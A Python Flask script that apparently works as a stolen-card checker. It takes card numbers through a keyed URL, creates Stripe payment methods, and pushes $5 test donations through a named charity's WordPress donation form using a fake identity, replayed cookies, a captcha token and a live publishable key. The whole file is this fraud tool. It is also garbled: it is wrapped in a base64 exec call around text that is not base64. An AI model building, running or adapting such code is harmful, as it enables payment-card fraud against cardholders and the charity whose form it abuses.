
import base64
exec(base64.b64decode('from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/key=<string:key>/cc=<string:cc>', methods=['GET'])
def process_cc(key, cc):
    # Validate the key
    if key != "dark":
        return jsonify({"error": "Invalid key"}), 403

    # Initialize session
    session = requests.Session()

    try:
        # Split the credit card details
        cc_number, exp_month, exp_year, cvc = cc.split('|')
    except ValueError:
        return jsonify({"error": "Invalid credit card format. Use CC|MM|YYYY|CVV"}), 400

    # Stripe API headers and data
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=Darkboy&billing_details[email]=darkboy3366%40gmail.com&billing_details[address][city]=Midland&billing_details[address][country]=US&billing_details[address][line1]=W+Gray+St&billing_details[address][postal_code]=57174&billing_details[address][state]=Alaska&billing_details[phone]=(925)+382-4193&card[number]={cc_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=556d4d0f-10a6-4698-9e8e-a474ee70dfd58489a5&muid=f766bdb4-87dd-40bf-92fe-913ad159995356abba&sid=0f854f42-e82a-422a-b24d-07b4e45d485ab48a55&pasted_fields=number&payment_user_agent=stripe.js%2F6a9fcf70ea%3B+stripe-js-v3%2F6a9fcf70ea%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=842147&key=pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNmZSQ1RndjM2RzQ1ZG0veEpVSktsbTk5V2FhZCsxYytybmVDM3Zza2h0VFpnSWk4MitRd2pCdGtzUHBnaFVPc0NjNHpuamoyUlB0NnJOUHV3cHNtK2UyVS84VDZjSXJjUnNHd2dqeDlTTHc2T2lQVUpQd1NuVVpWNUt6YVpBSDh4N0cxNWdUazMwendwSXdYNWNDZkV4RXljSkoxSUxWQWIrSEI4N3FGa3V1cHlld2ZyQmlGb013aTlobVlISGRNZjlFeFRVUDNJSi9POHMzaTVNZ0Y3cWpTLzVQT3grbEt5R3g0anVxcFVGN1EyYWpJVTlLOThTK3N6ai9zMDB4bE5jdXluRTRQT1k2V29LdjljNUZJY2xPTmErc0VaODlMS0pqSkR0RFZxcHhnQWhIRlc0YXhZbjZwSGRkUkpKa1V3VUxyNkZxbHVPbEw2enRIS0VxM0ZwZUJzREEvb25zbXJtY1I0Zkw2Umk3MjFmaUJnaVZvcDAvenNPa0JydW05NTU3eFQ3VDFNN01sTlQ0MjYwblR2RzRRd0d5andKZCtNSlpmVnladFdGT25qVnJmSUsyT0kzR2FnYmdvWkhDdVFGL1JXU3RUazJ3MXlLcFU2WEJSQklMeHJrd2xCc3BwTDFpTXhrUmlCSnBQdUFsaHFwd3JZWHlwSmNKTU1NdUJQS2pPMTRrUmNTSk9xL0NuOHlkN2EybVNhbXcySk1nVzlyajUyM3lJMUFGejEwWWlzNUVBN3lyLzh3RHVTVWtnYWdEZmF1THNVa1BZT1VlTUJta0ViamhKbU80YVlkWG1LUXVYK3FreGc5MGdjRGp5dURTMGE3YkpRWGV6NkVjRUY5UkNPS1hYRXU3eVVrR21KdHBKcnFkOEQvbWV5Qy9xWDdhM2dDYjVmRldzT1J1TlVnNE45R0JSbjJkUlVVTWpEa0ZYRFdQYjBJelV5OWczRGRNdll6anVmLzJIU3NBYXlUSEMzY1VRL01MUS9pOUREREcwK0RGaDlRenNjTlZ2ZThwd2FaWnk4QjIrdCtXU21HTmIzNGJiS2lLYVFyOFArWnlBdkcxUGIwQlFYUytJSTJPSFZWcmwwNnBzNkJ2K3djbTY5Zm5QUkJxNkhXK01hUTZ1ejJVK3BKWlk3QnhHUFV6Zi9URDdoYkJrSVRHVUE3Nml1ZFZOUXhJK0xNYmxRY0pqR1VOa0l0QXoybnJBbDZBMlpaYmFOWHd3ZCtmSWtDcnZZMDl1WmdoNUpSd3EvcWpMRDlWdjBzeVk4eXI3WnNUWFVTanZjck1RVDZzRUEzYXFCMml0N0daaCtjN2hISEM1b2x6cFlUc3hDWWx5MURIbENBckZEa0pJSVRvNkl4RVJvb2FaUjRzYmx4ZkE5a2dZSUFjKys2TlpnSmVhVUEwMUhqMVhJYjVocHZDWWlwVTZHdmtDa2d0andVck9jYWhtSnRVcjZiNjM4THVEcC9zZUptVTR3aXByY3lQdlE5Q1I4TjUyV0VoTHVYYWZFN2dZb256MmxYaVNuM3lEWXNIeXNjWXFtOEw3R3FGS1JMK1JzVGN5Q1gwbjBuVGFaN2JLNDI5TW93ZFF0Zm0zT2F4VTArY3IvcjgwL1RFOWQ5SXdXVk1xMzhoai9wT0twZEFMcjFhNWVNTXlOVXRpUnp5NlNhMEIzOGpmT1Q1TFgzMGlEZ3JFbytlTWtPYjRIYVRZTXh5dzFlcElkZEx3YS9qbzA3REQzbGJrTGc5Q0VHM0hQK2xGa2hhNHNKTXJ4Mjl3TmdRSS8vN2M1K0Jnc2I3ODVKQUtvVGZqZG9VSVhNUDdITTZWMnF4NUhSSjg2QWFZRWZkcXVKNGpULyttcFJqN3ZPeHFDb1hOdXBYUWxEbTAvZjVDQ1BGU0pqSC9nU1oxUjB3MjVucmNSWnNxNlEyWkh6T3pJVGtJWjNmQW1tcG02bUhjOXdkelFXRzZpcVFGNExLQzYyMExiaVNVS2ZLdE5iU2tSY2o0UHNmVVVXaFg5S21RRW1IT2xSUU1OMXF2cElnTldHWWp1MS9WM0VrQVAzcTNPYVZCekRya25CRldFTHpHRW8rQXpsN1RZZUs1TWRQeVVDRXFXcUJHZE1ZeXBCelZwVmI5Ymd1SExrQ0orbk1naXZNTzczMkxMTkJvaUxWR3NzaHlCL2V4amd5amJhZ1EzRGplek4vaFdsQytNbk1jL1R1dzlzakdqcHZKcHVCZmJQMXM3MjBGSjV2TWFoWlBtQVdoYjFZejcyOVN4Vlg1cGJMOGxkZlU0aHlNQmZOcGdqREI4Qms5Z2kzSmdLcXNPQ0J6YUZWYWNPQWI5Q3VVMUJOaGRENkRMaURZZ2g2Wmg5UTNxQmxGK3I2UUs2QUU4VSthVnhNMVVSZ2N4S2JQejBlRVVPTVNReVZVcGlTWHNRYzZqcEQzUnZwcUdsaDVTdHlEdzkzblRUc2hucWc1V0QrWGptMHd6c1VURVViaC91d2V0YVJ3RUx0dWdXaG8wbkxlcklZRlNiR2lhci91T1RLUTBvVTU2UTJyeTBSaDU5VkM0cnBFZFlnWmlkQ0ZYS1VQVWhFd2JHS1dhOTJNN3FRZGczWXdMMFJPcU1JaS90Z1R5TG9sT2QzKzM1TG5iL0tGeWVuZTJpSmg5NmhoaXo1MFluKzRXRWFMT2dscERxR0N6U24xNHAxbnFySFZxSkhwQk55WUpnQi9SVnlFV0diS2tqUlV0WWVCeExTMlgyQzNCdlp1TXZiL0JpSDJySnJBa1ZBUzg2cWIyZUxGOFo1N2ZmWWYydTdLTXkrbW5aUWV4cmJ2Qi9RSmhxMDdUd1ErOEwxQ3Z3M0Zad293eWZZdDhGWUxRMkd2SFdTUXlUNjM0NWM9IiwiZXhwIjoxNzQyMTY1NzMzLCJzaGFyZF9pZCI6MjU5MTg5MzU5LCJrciI6IjFhOWU3NzE0IiwicGQiOjAsImNkYXRhIjoiWWNseGYvSHRzK3JuMmRESHk4a0ZDcks5RVJIOU8rTlJweVY1ZFlIY0lUZ2c1eEZlZUJJTHJWbkpaSlp3NHIzYm9sTThMMDhkKzRneHhFV0ljeGEvMitKL1ljYjJyS0VtNHZwSThZVE91T1hZVURGWDhJWTVIaitvRlZtZXV5YU8rUjc0M3NoNlVzdEtTN2FnWm1DQkJUcmpkOW1QV3phMmt5QjlPVDNMYUd1UWxVbmZFV0VKelprVlNjOG9Wc09LSjB5M240dHArbmo4LzVkdSJ9.-hqb2hF1lIistEMMcwfEpKMd0SlrQI8MU5UGib3_V0E'

    # Create payment method with Stripe
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    # Check if payment method creation was successful
    if response.status_code != 200:
        return jsonify({"error": "Failed to create payment method", "details": response.text}), 400

    payment_method_id = response.json().get('id')

    # Submit donation form
    cookies = {
        'tk_or': '%22%22',
        'tk_lr': '%22%22',
        '__stripe_mid': 'f766bdb4-87dd-40bf-92fe-913ad159995356abba',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2025-03-16%2022%3A58%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2025-03-16%2022%3A58%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
        'tk_r3d': '%22%22',
        '__stripe_sid': '0f854f42-e82a-422a-b24d-07b4e45d485ab48a55',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F',
    }

    headers = {
        'authority': 'pipelineforchangefoundation.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pipelineforchangefoundation.com',
        'referer': 'https://pipelineforchangefoundation.com/donate/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = 'charitable_form_id=67d7508ba5afe&67d7508ba5afe=&_charitable_donation_nonce=01fdc66b0a&_wp_http_referer=%2Fdonate%2F&campaign_id=690&description=Donate+to+Pipeline+for+Change+Foundation&ID=175412&recurring_donation=once&custom_recurring_donation_amount=&recurring_donation_period=once&donation_amount=custom&custom_donation_amount=5.00&first_name=Dark&last_name=Boy&email=darkboy3366%40gmail.com&address=W+Gray+St&address_2=&city=Midland&state=Alaska&postcode=57174&country=US&phone=(925)+382-4193&gateway=stripe&stripe_payment_method=' + payment_method_id + '&action=make_donation&form_action=make_donation'

    response = session.post(
        'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    return jsonify({"donation_response": response.text})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
').decode())
